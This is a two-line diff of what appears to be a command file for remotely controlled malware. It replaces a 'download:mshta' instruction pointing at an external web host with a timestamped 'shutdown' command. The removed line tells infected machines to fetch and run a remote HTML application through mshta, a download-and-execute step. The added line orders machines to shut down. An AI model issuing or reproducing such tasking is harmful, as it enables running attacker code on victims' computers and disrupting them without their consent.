@@ -1,1 +1,1 @@
-download:mshta https://onlinedice.up.railway.app|1790120776
+shutdown|1790120826
